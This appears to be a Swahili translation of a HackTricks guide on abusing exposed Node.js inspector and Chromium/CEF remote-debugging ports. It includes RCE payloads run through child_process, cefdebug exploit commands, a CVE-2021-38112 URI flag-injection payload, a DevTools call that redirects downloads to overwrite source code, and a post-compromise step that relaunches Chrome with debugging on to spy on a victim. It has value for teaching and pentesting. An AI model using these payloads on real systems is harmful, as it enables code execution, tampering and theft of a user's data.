# Kudanganya kwa Node inspector/CEF debug

<details>

<summary><strong>Jifunze AWS kudukua kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Taarifa Msingi

[Kutoka kwa nyaraka](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Wakati inapoanzishwa na kubadilisha `--inspect`, mchakato wa Node.js unasikiliza mteja wa kudukua. Kwa **default**, itasikiliza kwenye mwenyeji na bandari **`127.0.0.1:9229`**. Kila mchakato pia hupewa **UUID** **ya kipekee**.

Wateja wa Inspector lazima wajue na kutaja anwani ya mwenyeji, bandari, na UUID kuunganisha. URL kamili itaonekana kama `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
Kwa kuwa **kudukua kuna ufikiaji kamili wa mazingira ya utekelezaji wa Node.js**, mwigizaji mwenye nia mbaya anayeweza kuunganisha kwenye bandari hii anaweza kutekeleza nambari ya kupindukia kwa niaba ya mchakato wa Node.js (**kuongezeka kwa mamlaka ya upeo**).
{% endhint %}

Kuna njia kadhaa za kuanzisha inspector:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Unapoanza mchakato uliochunguzwa kitu kama hiki kitatokea:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Mchakato unaotegemea **CEF** (**Chromium Embedded Framework**) kama unahitaji kutumia param: `--remote-debugging-port=9222` ili kufungua **debugger** (ulinzi wa SSRF unabaki sawa sana). Hata hivyo, badala yake ya kutoa kikao cha **debug** cha **NodeJS** kitawasiliana na kivinjari kutumia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), hii ni kiolesura cha kudhibiti kivinjari, lakini hakuna RCE moja kwa moja.

Unapoanzisha kivinjari kilichodhibitishwa kama hiki kitatokea:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Vivinjari, WebSockets na sera ya asili <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Tovuti zilizofunguliwa kwenye kivinjari cha wavuti zinaweza kufanya ombi la WebSocket na HTTP chini ya mfano wa usalama wa kivinjari. **Unganisho wa kwanza wa HTTP** ni muhimu kwa **kupata kitambulisho cha kikao cha debugger**. **Sera sawa na asili** **inazuia** tovuti kutoka kufanya **unganisho hili la HTTP**. Kwa usalama zaidi dhidi ya [**mashambulizi ya kurejelea DNS**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** Node.js inathibitisha kuwa vichwa vya **'Host'** kwa uhusiano vinabainisha **anwani ya IP** au **`localhost`** au **`localhost6`** kwa usahihi.

{% hint style="info" %}
Hatua hizi za **usalama zinazuia kutumia inspector** kutekeleza nambari kwa **kutuma tu ombi la HTTP** (ambalo lingeweza kufanywa kwa kutumia udhaifu wa SSRF).
{% endhint %}

### Kuanza inspector katika michakato inayoendelea

Unaweza kutuma **ishara SIGUSR1** kwa mchakato wa nodejs unaofanya kazi ili kufanya **ianze inspector** kwenye bandari ya msingi. Walakini, kumbuka kuwa unahitaji **mamlaka za kutosha**, hivyo hii inaweza kukupatia **upatikanaji wa mamlaka kwa habari ndani ya mchakato** lakini sio ukuaji wa moja kwa moja wa mamlaka.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
Hii ni muhimu katika vyombo kwa sababu **kuzima mchakato na kuanzisha mpya** na `--inspect` sio **chaguo** kwa sababu **kontena** itauawa na mchakato.
{% endhint %}

### Unganisha kwa mkaguzi/mchunguzi

Kuunganisha kwa kivinjari **kinachotegemea Chromium**, URL za `chrome://inspect` au `edge://inspect` zinaweza kufikiwa kwa Chrome au Edge, mtawalia. Kwa kubonyeza kitufe cha Configure, ni lazima kuhakikisha kuwa **mwenyeji na bandari ya lengo** zimeorodheshwa kwa usahihi. Picha inaonyesha mfano wa Utekelezaji wa Kanuni kwa Mbali (RCE):

![](<../../.gitbook/assets/image (674).png>)

Kutumia **mstari wa amri** unaweza kuunganisha kwa mkaguzi/mchunguzi na:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
The tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), inaruhusu **kupata wachunguzi** wanaofanya kazi kwa ndani na **kuingiza msimbo** ndani yao.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
Tafadhali kumbuka kwamba **NodeJS RCE exploits haitafanya kazi** ikiwa unahusishwa na kivinjari kupitia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (unahitaji kuangalia API ili kupata vitu vya kuvutia vya kufanya nayo).
{% endhint %}

## RCE katika NodeJS Debugger/Inspector

{% hint style="info" %}
Ikiwa umekuja hapa ukitafuta jinsi ya kupata [**RCE kutoka kwa XSS katika Electron tafadhali angalia ukurasa huu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

Baadhi ya njia za kawaida za kupata **RCE** unapoweza **kuhusisha** kwenye Node **inspector** ni kutumia kitu kama hiki (inaonekana kwamba hii **haitafanya kazi katika uhusiano na Chrome DevTools protocol**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Malipo ya Itifaki ya Chrome DevTools

Unaweza kuangalia API hapa: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
Katika sehemu hii nitataja mambo ya kuvutia ambayo watu wamegundua wanaweza kutumia kudanganya itifaki hii.

### Uingizaji wa Parameta kupitia Viungo vya Kina

Katika [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security iligundua kwamba programu iliyotegemea CEF **iliandikisha URI ya desturi** kwenye mfumo (workspaces://) ambayo ilipokea URI kamili na kisha **kuzindua programu iliyotegemea CEF** na usanidi uliokuwa sehemu iliyoundwa kutoka kwa URI hiyo.

Iligundulika kwamba parameta za URI zilikuwa zimefanyiwa URL decode na kutumika kuzindua programu ya msingi ya CEF, kuruhusu mtumiaji **kudukua** bendera **`--gpu-launcher`** kwenye **mstari wa amri** na kutekeleza mambo yoyote. 

Hivyo, malipo kama:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
### Badilisha Faili

Badilisha folda ambapo **faili zilizopakuliwa zitahifadhiwa** na pakua faili ili **kubadilisha** mara kwa mara **mikodisho ya chanzo** ya programu na **mikodisho yako ya uovu**.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Uchomaji wa mbali wa Webdriver na utoaji wa data

Kulingana na chapisho hili: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) inawezekana kupata RCE na kutoa kurasa za ndani kutoka kwa dereva.

### Baada ya Uvamizi

Katika mazingira halisi na **baada ya kuvamia** kompyuta ya mtumiaji inayotumia kivinjari kinachotegemea Chrome/Chromium unaweza kuzindua mchakato wa Chrome na **kuwezesha uchunguzi na kuhamisha bandari ya uchunguzi** ili uweze kufikia hiyo. Kwa njia hii utaweza **kuchunguza kila kitu ambacho muathiriwa anafanya na Chrome na kuiba taarifa nyeti**.

Njia ya kisiri ni **kukomesha kila mchakato wa Chrome** na kisha kuita kitu kama
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Marejeo

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
